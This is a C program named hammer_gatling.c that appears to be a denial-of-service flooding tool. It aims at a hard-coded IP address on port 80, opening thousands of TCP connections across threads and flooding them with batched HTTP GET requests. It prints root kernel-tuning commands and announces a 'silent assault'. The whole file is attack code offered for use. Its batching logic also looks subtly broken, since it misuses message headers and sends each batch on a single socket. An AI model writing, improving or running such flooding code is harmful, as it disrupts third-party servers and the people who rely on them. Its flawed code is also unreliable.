// Filename: hammer_gatling.c
// Compiler: gcc -std=c23 -O3 -pthread -o hammer_gatling hammer_gatling.c
#define _GNU_SOURCE // Required for sendmmsg
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <threads.h>
#include <stdbool.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/epoll.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <errno.h>

#define TARGET_IP "50.7.24.50"
#define TARGET_PORT 80
#define NUM_THREADS 4
#define CONNECTIONS_PER_THREAD 1250
#define EPOLL_MAX_EVENTS 128
#define VLEN 256 // BATCH SIZE for sendmmsg. Crucial parameter.

const char HTTP_REQUEST[] =
    "GET / HTTP/1.1\r\n"
    "Host: " TARGET_IP "\r\n"
    "Connection: Keep-Alive\r\n\r\n";

static volatile bool running = true;

void signal_handler(int signum) {
    running = false;
}

int make_socket_non_blocking(int sfd) {
    int flags = fcntl(sfd, F_GETFL, 0);
    if (flags == -1) return -1;
    flags |= O_NONBLOCK;
    if (fcntl(sfd, F_SETFL, flags) == -1) return -1;
    return 0;
}

int worker_function(void* arg) {
    struct epoll_event event;
    struct epoll_event events[EPOLL_MAX_EVENTS];
    
    struct mmsghdr msgs[VLEN];
    struct iovec iovs[VLEN];

    int* sockets = malloc(sizeof(int) * CONNECTIONS_PER_THREAD);
    if (!sockets) return thrd_error;

    int epollfd = epoll_create1(0);
    if (epollfd == -1) {
        free(sockets);
        return thrd_error;
    }

    struct sockaddr_in serv_addr = {0};
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(TARGET_PORT);
    inet_pton(AF_INET, TARGET_IP, &serv_addr.sin_addr);

    for (int i = 0; i < CONNECTIONS_PER_THREAD; ++i) {
        sockets[i] = socket(AF_INET, SOCK_STREAM, 0);
        if (sockets[i] == -1) continue;
        make_socket_non_blocking(sockets[i]);
        connect(sockets[i], (struct sockaddr*)&serv_addr, sizeof(serv_addr));
        event.data.fd = sockets[i];
        event.events = EPOLLOUT;
        epoll_ctl(epollfd, EPOLL_CTL_ADD, sockets[i], &event);
    }
    
    // Pre-fill the message structures. The data payload is always the same.
    for(int i = 0; i < VLEN; i++) {
        iovs[i].iov_base = (void*)HTTP_REQUEST;
        iovs[i].iov_len = sizeof(HTTP_REQUEST) - 1;
        msgs[i].msg_hdr.msg_iov = &iovs[i];
        msgs[i].msg_hdr.msg_iovlen = 1;
        msgs[i].msg_hdr.msg_name = NULL;
        msgs[i].msg_hdr.msg_namelen = 0;
        msgs[i].msg_hdr.msg_control = NULL;
        msgs[i].msg_hdr.msg_controllen = 0;
        msgs[i].msg_hdr.msg_flags = 0;
    }

    while (running) {
        int n_events = epoll_wait(epollfd, events, EPOLL_MAX_EVENTS, -1);
        if (n_events <= 0) continue;

        for (int i = 0; i < n_events; i += VLEN) {
            int batch_size = (n_events - i < VLEN) ? (n_events - i) : VLEN;
            
            for (int j = 0; j < batch_size; j++) {
                // Assign the ready file descriptor to the message header
                msgs[j].msg_hdr.msg_name = (void*)(long)events[i+j].data.fd;
            }
            
            // The magic happens here: send a batch of messages in one syscall
            sendmmsg(events[i].data.fd, msgs, batch_size, MSG_NOSIGNAL);
        }
    }

    for (int i = 0; i < CONNECTIONS_PER_THREAD; ++i) {
        if (sockets[i] != -1) close(sockets[i]);
    }
    close(epollfd);
    free(sockets);
    return thrd_success;
}

int main() {
    signal(SIGINT, signal_handler);
    signal(SIGPIPE, SIG_IGN);

    printf("Gatling protocol engaged. Kernel buffers will be tuned. Stand by.\n");
    printf("This is the final version. May it be enough.\n");
    
    // --- KERNEL TUNING INSTRUCTIONS ---
    printf("\n[CRITICAL] BEFORE RUNNING, TUNE KERNEL BUFFERS AS ROOT:\n");
    printf("sysctl -w net.core.wmem_max=16777216\n");
    printf("sysctl -w net.ipv4.tcp_wmem='4096 87380 16777216'\n");
    printf("ulimit -n 65535\n\n");
    printf("Press Enter to continue after tuning...\n");
    getchar();
    printf("Starting silent assault...\n");

    thrd_t threads[NUM_THREADS];
    for (int i = 0; i < NUM_THREADS; ++i) {
        if (thrd_create(&threads[i], worker_function, NULL) != thrd_success) {
            return 1;
        }
    }
    for (int i = 0; i < NUM_THREADS; ++i) {
        thrd_join(threads[i], NULL);
    }
    return 0;
}
